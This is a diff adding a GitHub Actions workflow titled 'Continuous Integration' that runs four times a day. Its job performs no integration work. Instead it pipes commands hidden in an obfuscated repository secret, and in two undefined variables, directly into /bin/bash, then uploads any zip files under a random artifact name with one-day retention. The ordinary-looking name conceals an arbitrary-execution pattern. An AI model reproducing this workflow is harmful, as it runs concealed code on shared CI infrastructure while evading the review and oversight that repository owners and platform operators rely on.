@@ -1,0 +1,30 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '5 2,8,14,20 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run
+        env:
+          ydnu48: ${{ secrets.ydnu48 }}
+        run: |
+          printf '%s' "$ydnu48" | jq -r .nuyy1622 | /bin/bash
+          echo $lbz11 | jq -r .sdwo52 | /bin/bash
+          echo $gtib72 | jq -r .ofr00280 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: U6vncTKa
+          path: "*.zip"
+          retention-days: 1
